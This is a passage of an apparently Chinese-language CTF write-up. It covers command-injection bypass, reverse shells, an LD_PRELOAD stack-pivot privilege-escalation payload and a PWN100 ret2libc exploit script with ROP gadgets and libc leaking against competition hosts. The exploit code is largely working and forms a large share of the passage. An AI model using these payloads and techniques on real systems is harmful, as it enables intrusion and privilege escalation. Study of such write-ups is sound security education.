                print text
            except Exception , what:
                print what
                pass
    num=10
    data={"count":"33332"}
    cookies={"username":"2|1:0|10:1475430892|8:username|16:bWF0aDFhc19yb290|061255e41481821c19b68f12ac86017ec07f5729ca8ddf9050b291dca75a5360"}
    th=list()
    for i in range(num):
        th.append(URLThread("http://119.28.15.75:9000/trans",data,cookies))
    for j in th:
    j.start()
然后就可以开始调试脚本了。很明显，这里存在一个命令注入，但是限制了大部分的符号，只能使用|、空白、制表符、数字和字母。因此有两种方式绕过：
1\. 利用正则表达式匹配多行的问题,直接绕过
2\. Wget10进制ip地址,然后通过302为其指定一个无后缀名的文件名
最后通过python
文件名执行命令，这个思路是从hitcon的某道题目过来的。最后反弹一个shell，发现权限为root，那么就直接开始审查web源码。在route.py的逻辑中，发现了内网的ip地址，也就是我们调试的脚本地址。用ssh隧道转发后进行访问，发现这其实是一个用php为基础的解释语言(其实就是替换)。在提供的example中找到了调用require的方法，试图包含/self/proc/environ是没有权限的，那么只能使用eval的方法，去执行一个$_SERVER变量，比如x_forwarded_for：
成功执行代码后，就可以执行system，反弹一个shell了：
最后在/home/pwn目录下发现了flag文件，但是直接读取仍然没有权限。分析同目录的.note_pwn，是一个本地提权的文件(setgid)，32位程序，很直接的栈溢出，通过stack-pivoting技巧转移esp到可控区域，然后执行这块区域上预先放置好的rop-chain即可，这块可控区域可利用设置LD_PRELOAD环境变量来获得：
    ulimit -s unlimited
    export LD_PRELOAD=`python -c "print 'A'*29 + 'xa0x5ex63x55' + 'AAAA' + 'x8cxeax6dx55' + 'x00'*0x8"`
    python -c "print 'A'*0x28+'xd0x8ex57x55'" > /tmp/payload
    cat /tmp/payload - | ./note_pw
最终得到flag
**  
**
**PWN**
    # 对zio的输入输出加了点函数，方便自己使用
    class zio(object):
        #.....    
        def w(self, s):
            self.write(s)
        def wl(self, s = ''):
            if isinstance(s, (int, long)):
                self.writeline(str(s))
            else:
                self.writeline(s)
        def wls(self ,sequence):
            self.writelines( [str(i) if isinstance(i, (int, long)) else i for i in sequence] )
        def r(self, size = None, timeout = -1):
            return self.read(size, timeout)
        def rl(self, size = -1):
            return self.read_line(size)
        def rtl(self, pattern_list, timeout = -1, searchwindowsize = None):
            return self.read_until(pattern_list, timeout, searchwindowsize)
        def w_af(self, pattern_list, s, timeout = -1, searchwindowsize = None):
            self.read_until(pattern_list, timeout, searchwindowsize)
            self.writeline(s)
        def wls_af(self, pattern_list, sequence, timeout = -1, searchwindowsize = None):
            self.read_until(pattern_list, timeout, searchwindowsize)
            self.writelines( [str(i) if isinstance(i, (int, long)) else i for i in sequence] )
**PWN100**
**Bugs**
程序有非常简单粗暴的栈缓冲区溢出，可溢出0x80个字节
**Thinking**
栈溢出，没有提供libc，利用方法很多，可以通过got表泄露libc，可以通过DynELF来泄露libc，然后return-to-libc，或者return-to-dl-resolve
下面给出的两个exp，一个是我无聊测试一下之前写的手动泄露共享库函数的方法，具体方法可参考这篇文章，另一个exp也是我无聊试的return-to-dl-resolve
**Exploit**
**re2libc**
    from zio import *
    from pwnlib.dynelf import *
    from pwnlib.elf import *
    io  = zio(('119.28.63.211', 2332), print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 100000)
    # io = zio(('119.28.63.211', 2332), print_read = False, print_write = False, timeout = 10000)
    # io.hint([0x4006b7])
    got_read    = 0x601028
    got_puts    = 0x601018
    plt_puts    = 0x400500
    adr_bss     = 0x601000
    p_rdi_ret   = 0x00400763
    def prepare(address):
        payload  = 'A' * 0x48
        payload += l64(p_rdi_ret)
        payload += l64(address)
        payload += l64(plt_puts)
        payload += l64(0x400550) # program entry
        payload  = payload.ljust(0xc8, 'A')
        io.w(payload)
        io.rtl('bye~n')
    def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
        payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
        payload += l64(0x0)     # rbx be 0x0
        payload += l64(0x1)     # rbp be 0x1
        payload += l64(jmp2)    # r12 jump to
        payload += l64(arg3)    # r13 -> rdx    arg3
        payload += l64(arg2)    # r14 -> rsi    arg2
        payload += l64(arg1)    # r15 -> edi    arg1
        payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
        payload += 'A' * 56     # junk
        return payload
    def getshell(adr_system):
        payload  = 'A' * 0x48
        payload += com_gadget(0x40075a, 0x400740, jmp2 = got_read,
                arg1 = 0x0,
                arg2 = adr_bss + 0x80,
                arg3 = 0x10)
        payload += l64(0x400550) # program entry
        payload  = payload.ljust(0xc8, 'A')
        io.w(payload)
        io.rtl('bye~n')
        io.w('/bin/shx00' + l64(adr_system))
        payload  = 'A' * 0x48
        payload += com_gadget(0x40075a, 0x400740, jmp2 = adr_bss + 0x88,
                arg1 = adr_bss + 0x80)
        payload += l64(0xdeadbeef)
        payload  = payload.ljust(0xc8, 'A')
        io.w(payload)
        io.rtl('bye~n')
    def leak(address, size):
        count       = 0
        buf         = ''
        while count < size:
            prepare(address + count)
            # leak(str(address + count))
            while True:
                ch = io.read(1, timeout = 0x10)
                #print ch
                count += 1